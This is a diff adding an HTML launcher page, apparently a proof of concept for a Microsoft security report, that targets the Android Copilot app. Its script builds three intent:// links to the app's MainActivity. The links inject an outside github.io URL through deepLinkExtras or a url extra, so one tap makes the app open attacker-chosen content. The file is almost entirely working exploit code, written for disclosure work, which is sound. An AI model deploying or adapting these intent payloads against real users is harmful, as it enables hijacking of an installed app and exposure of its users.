@@ -1,0 +1,41 @@
+<!doctype html>
+<title>MSRC 118816 Launcher (Intent)</title>
+<style>body{font-family:system-ui;padding:40px;text-align:center}
+a{display:inline-block;padding:18px 36px;background:#d40078;color:#fff;
+  border-radius:8px;text-decoration:none;font-size:20px;margin:12px}</style>
+<h2>MSRC 118816 — Intent deepLinkExtras PoC</h2>
+<p>Open on Android phone with Copilot installed, tap button:</p>
+
+<a id="v1">Variant 1: deepLinkExtras JSON</a><br><br>
+<a id="v2">Variant 2: deepLinkExtras with dev-playground</a><br><br>
+<a id="v3">Variant 3: URL as standalone extra</a>
+
+<pre id="out" style="text-align:left;background:#f4f4f4;padding:12px;border-radius:6px;font-size:12px;margin-top:24px"></pre>
+
+<script>
+var payload = "https://mrsuman2002.github.io/jobid/jobid.html";
+
+// Variant 1: deepLinkExtras with url key
+var v1 = "intent://#Intent;"
+  + "component=com.microsoft.copilot/com.microsoft.copilotn.MainActivity;"
+  + "S.deepLinkExtras=" + encodeURIComponent('{"url":"' + payload + '"}') + ";"
+  + "end";
+
+// Variant 2: deepLinkExtras with dev-playground key
+var v2 = "intent://#Intent;"
+  + "component=com.microsoft.copilot/com.microsoft.copilotn.MainActivity;"
+  + "S.deepLinkExtras=" + encodeURIComponent('{"dev-playground":"' + payload + '"}') + ";"
+  + "end";
+
+// Variant 3: URL as a standalone string extra
+var v3 = "intent://#Intent;"
+  + "component=com.microsoft.copilot/com.microsoft.copilotn.MainActivity;"
+  + "S.url=" + encodeURIComponent(payload) + ";"
+  + "end";
+
+document.getElementById('v1').href = v1;
+document.getElementById('v2').href = v2;
+document.getElementById('v3').href = v3;
+document.getElementById('out').textContent =
+  "V1: " + v1 + "\n\nV2: " + v2 + "\n\nV3: " + v3;
+</script>
